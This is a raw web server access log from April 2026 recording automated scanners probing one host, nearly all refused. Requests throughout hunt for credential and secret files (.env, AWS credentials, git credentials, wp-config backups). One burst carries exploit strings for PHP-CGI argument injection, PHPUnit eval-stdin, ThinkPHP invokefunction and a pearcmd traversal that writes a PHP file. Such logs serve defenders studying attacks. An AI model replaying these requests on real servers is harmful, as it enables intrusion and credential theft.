[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/.aws/credentials" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/.env.production" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/.aws/config" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/test.php" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/debug.php" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/.npmrc" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/.netrc" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/.env.bak" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/_profiler" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/.env.old" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/wp-config.php.bak" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/.env.save" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/api/.env" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/wp-config.php.old" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/backend/.env" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/wp-config.php.swp" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/wp-config.php~" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/backup/wp-config.php" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/public/.env" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/config/database.php" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/config/.env" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/laravel/.env" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/config/database.yml" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/config/secrets.yml" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (compatible; SecurityScanner/1.0)" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/config/mail.php" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/actuator/env" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/actuator/heapdump" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (compatible; SecurityScanner/1.0)" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/application.properties" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/application.yml" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/appsettings.json" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/web.config" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/.gitlab-ci.yml" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/terraform.tfstate" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/terraform.tfvars" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (compatible; SecurityScanner/1.0)" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/secrets.json" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/secrets.yml" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/credentials.json" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (compatible; SecurityScanner/1.0)" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/.git/config" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/.git/HEAD" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/.git-credentials" [Client 103.215.75.70] [Length 150] [Gzip -] "Mozilla/5.0 (compatible; SecurityScanner/1.0)" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/backup.sql" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:57 +0000] 404 - GET http 212.33.46.41 "/dump.sql" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:58 +0000] 404 - GET http 212.33.46.41 "/database.sql" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:58 +0000] 404 - GET http 212.33.46.41 "/wp-content/debug.log" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:00:58 +0000] 404 - GET http 212.33.46.41 "/error_log" [Client 103.215.75.70] [Length 552] [Gzip -] "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:12:45 +0000] 400 - POST http localhost-nginx-proxy-manager "-" [Client 1.54.7.15] [Length 154] [Gzip -] "-" "-"
[20/Apr/2026:20:12:46 +0000] 400 - POST http localhost-nginx-proxy-manager "-" [Client 1.54.7.15] [Length 154] [Gzip -] "-" "-"
[20/Apr/2026:20:12:46 +0000] 404 - POST http 212.33.46.41 "/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:47 +0000] 405 - POST http 212.33.46.41 "/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" [Client 1.54.7.15] [Length 154] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:47 +0000] 404 - GET http 212.33.46.41 "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:47 +0000] 404 - GET http 212.33.46.41 "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:48 +0000] 404 - GET http 212.33.46.41 "/vendor/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:48 +0000] 404 - GET http 212.33.46.41 "/vendor/phpunit/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:48 +0000] 404 - GET http 212.33.46.41 "/vendor/phpunit/phpunit/LICENSE/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:49 +0000] 404 - GET http 212.33.46.41 "/vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:49 +0000] 404 - GET http 212.33.46.41 "/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:49 +0000] 404 - GET http 212.33.46.41 "/phpunit/phpunit/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:50 +0000] 404 - GET http 212.33.46.41 "/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:50 +0000] 404 - GET http 212.33.46.41 "/phpunit/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:50 +0000] 404 - GET http 212.33.46.41 "/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:51 +0000] 404 - GET http 212.33.46.41 "/lib/phpunit/phpunit/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:51 +0000] 404 - GET http 212.33.46.41 "/lib/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:51 +0000] 404 - GET http 212.33.46.41 "/lib/phpunit/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:51 +0000] 404 - GET http 212.33.46.41 "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:52 +0000] 404 - GET http 212.33.46.41 "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:52 +0000] 404 - GET http 212.33.46.41 "/www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:52 +0000] 404 - GET http 212.33.46.41 "/ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:53 +0000] 404 - GET http 212.33.46.41 "/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:53 +0000] 404 - GET http 212.33.46.41 "/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:53 +0000] 404 - GET http 212.33.46.41 "/ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:54 +0000] 404 - GET http 212.33.46.41 "/V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:54 +0000] 404 - GET http 212.33.46.41 "/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:54 +0000] 404 - GET http 212.33.46.41 "/test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:55 +0000] 404 - GET http 212.33.46.41 "/testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:55 +0000] 404 - GET http 212.33.46.41 "/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:55 +0000] 404 - GET http 212.33.46.41 "/demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:55 +0000] 404 - GET http 212.33.46.41 "/cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:56 +0000] 404 - GET http 212.33.46.41 "/crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:56 +0000] 404 - GET http 212.33.46.41 "/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:56 +0000] 404 - GET http 212.33.46.41 "/backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:57 +0000] 404 - GET http 212.33.46.41 "/blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:57 +0000] 404 - GET http 212.33.46.41 "/workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:57 +0000] 404 - GET http 212.33.46.41 "/panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:58 +0000] 404 - GET http 212.33.46.41 "/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:58 +0000] 404 - GET http 212.33.46.41 "/apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:58 +0000] 404 - GET http 212.33.46.41 "/app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:59 +0000] 404 - GET http 212.33.46.41 "/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:59 +0000] 404 - GET http 212.33.46.41 "/public/index.php?s=/index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:59 +0000] 403 - GET http 212.33.46.41 "/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:12:59 +0000] 403 - GET http 212.33.46.41 "/index.php?lang=../../../../../../../../tmp/index1" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:13:00 +0000] 404 - GET http 212.33.46.41 "/containers/json" [Client 1.54.7.15] [Length 150] [Gzip -] "libredtail-http" "-"
[20/Apr/2026:20:32:38 +0000] 404 - GET http 212.33.46.41 "/.env" [Client 77.83.39.197] [Length 183] [Gzip 3.21] "Mozilla/5.0 (Linux; Android 8.0.0; SM-A910F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36" "-"
[20/Apr/2026:20:38:58 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 198.235.24.71] [Length 154] [Gzip -] "-" "-"
[20/Apr/2026:20:38:58 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 198.235.24.71] [Length 154] [Gzip -] "-" "-"
[20/Apr/2026:20:49:43 +0000] 400 - GET http 212.33.46.41 "/vpn" [Client 88.210.63.79] [Length 654] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" "https://www.google.com"
[20/Apr/2026:20:50:02 +0000] 200 - GET http 212.33.46.41 "/" [Client 3.132.26.232] [Length 568] [Gzip 1.86] "visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:52:16 +0000] 200 - GET http 212.33.46.41 "/" [Client 3.132.26.232] [Length 568] [Gzip 1.86] "visionheight.com/scan Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36" "-"
[20/Apr/2026:20:53:06 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 3.132.26.232] [Length 0] [Gzip -] "-" "-"
[20/Apr/2026:20:55:22 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 3.132.26.232] [Length 154] [Gzip -] "-" "-"
[20/Apr/2026:20:57:30 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 3.132.26.232] [Length 154] [Gzip -] "-" "-"
[20/Apr/2026:20:59:03 +0000] 400 - - http localhost-nginx-proxy-manager "-" [Client 3.132.26.232] [Length 154] [Gzip -] "-" "-"
[20/Apr/2026:20:59:07 +0000] 200 - GET http 212.33.46.41 "/" [Client 129.226.213.145] [Length 568] [Gzip 1.86] "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
[20/Apr/2026:21:11:59 +0000] 400 - GET http 212.33.46.41 "/remote/login" [Client 88.210.63.126] [Length 654] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" "https://www.google.com"
[20/Apr/2026:21:11:59 +0000] 400 - GET http 212.33.46.41 "/login?redir=" [Client 88.210.63.126] [Length 654] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36" "https://www.google.com"
[20/Apr/2026:21:40:07 +0000] 400 - POST http localhost-nginx-proxy-manager "-" [Client 121.229.45.117] [Length 154] [Gzip -] "-" "-"
[20/Apr/2026:22:14:21 +0000] 200 - GET http 212.33.46.41 "/" [Client 43.156.109.53] [Length 568] [Gzip 1.86] "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1" "-"
[20/Apr/2026:23:07:26 +0000] 400 - GET http 212.33.46.41 "/" [Client 137.184.226.250] [Length 252] [Gzip -] "Mozilla/5.0 zgrab/0.x" "-"
[20/Apr/2026:23:09:53 +0000] 200 - GET http marcel0501.myqnapcloud.com "/" [Client 103.215.74.185] [Length 1033] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:23:09:54 +0000] 404 - GET http marcel0501.myqnapcloud.com "/.env.backup" [Client 103.215.74.185] [Length 150] [Gzip -] "Mozilla/5.0 (compatible; SecurityScanner/1.0)" "-"
[20/Apr/2026:23:09:54 +0000] 404 - GET http marcel0501.myqnapcloud.com "/.env" [Client 103.215.74.185] [Length 150] [Gzip -] "Mozilla/5.0 (compatible; SecurityScanner/1.0)" "-"
[20/Apr/2026:23:09:54 +0000] 200 - GET http marcel0501.myqnapcloud.com "/" [Client 103.215.74.185] [Length 1033] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:23:09:54 +0000] 404 - GET http marcel0501.myqnapcloud.com "/phpinfo.php" [Client 103.215.74.185] [Length 150] [Gzip -] "Mozilla/5.0 (compatible; SecurityScanner/1.0)" "-"
[20/Apr/2026:23:09:54 +0000] 404 - GET http marcel0501.myqnapcloud.com "/php.php" [Client 103.215.74.185] [Length 150] [Gzip -] "Mozilla/5.0 (compatible; SecurityScanner/1.0)" "-"
[20/Apr/2026:23:09:54 +0000] 404 - GET http marcel0501.myqnapcloud.com "/.env.production" [Client 103.215.74.185] [Length 552] [Gzip -] "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
[20/Apr/2026:23:09:54 +0000] 404 - GET http marcel0501.myqnapcloud.com "/test.php" [Client 103.215.74.185] [Length 552] [Gzip -] "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" "-"
